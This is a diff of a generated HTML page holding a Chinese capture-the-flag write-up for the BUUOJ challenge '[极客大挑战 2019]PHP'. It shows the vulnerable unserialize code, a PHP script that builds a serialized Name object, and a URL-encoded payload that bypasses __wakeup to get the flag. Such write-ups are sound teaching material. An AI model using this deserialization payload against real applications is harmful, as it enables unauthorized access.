@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -247,7 +255,7 @@
             <div class="markdown-body">
               <h2 id="十一、"><a href="#十一、" class="headerlink" title="十一、"></a>十一、</h2><h3 id="题目：-极客大挑战-2019-PHP"><a href="#题目：-极客大挑战-2019-PHP" class="headerlink" title="题目：[极客大挑战 2019]PHP"></a>题目：[极客大挑战 2019]PHP</h3><p><img src="https://ftp.bmp.ovh/imgs/2021/01/c09882d30a32c90f.png" srcset="/img/loading.gif">         </p>
 <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>网页提示说备份网站，用御剑扫，没扫出来<br>换为<code>dirsearch</code>扫出来一个<code>www.zip</code><img src="https://ftp.bmp.ovh/imgs/2021/01/96633462d343eda9.png" srcset="/img/loading.gif"><br>加到url后面<code>http://63f0b170-4c01-4aa2-9608-5d33d689c712.node3.buuoj.cn/www.zip</code>得到一个压缩包，内有五个文件<br>主要内容：<br><code>index.php</code> :    </p>
-<div class="hljs"><pre><code><pre><code class="hljs php">		<span class="hljs-meta">&lt;?php</span>             
+<pre><code><pre><code class="hljs php">		<span class="hljs-meta">&lt;?php</span>             
 	    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;          
 	    $select = $_GET[<span class="hljs-string">&#x27;select&#x27;</span>];          
 	    $res=unserialize(@$select);           
@@ -298,9 +306,9 @@ GET select参数，反序列化
 			        &#125;
 			    &#125;
 			&#125;
-			<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+			<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
 <p>username为admin；password为100时，输出flag<br>因为传入的select会经过反序列化，所以构造的参数应该经过序列化<br>一位大佬的源码：     </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>
 <span class="hljs-class"></span>&#123;
     <span class="hljs-keyword">private</span> $username = <span class="hljs-string">&quot;yesyesyes&quot;</span>;
@@ -317,7 +325,7 @@ $a = <span class="hljs-keyword">new</span> Name(@admin,<span class="hljs-number"
 $b = serialize($a);
 <span class="hljs-keyword">echo</span> $b.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-comment">//输出序列化</span>
 <span class="hljs-keyword">echo</span> urlencode($b);<span class="hljs-comment">//输出url编码后的序列化</span>
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
 <p>还需要绕过<code>_wakeup()</code>,将属性数改为3或者大于3的数字即可         </p>
 <h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>payload：<code>?select=O%3A4%3A&quot;Name&quot;%3A4%3A&#123;s%3A14%3A&quot;%00Name%00username&quot;%3Bs%3A5%3A&quot;admin&quot;%3Bs%3A14%3A&quot;%00Name%00password&quot;%3Bi%3A100%3B&#125;</code><img src="https://ftp.bmp.ovh/imgs/2021/01/9362857e700a46b0.png" srcset="/img/loading.gif">      </p>
 <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>php序列化与反序列化</strong>          </p>
@@ -469,6 +477,8 @@ $b = serialize($a);
 
 
 
+  
+    
   
 
 
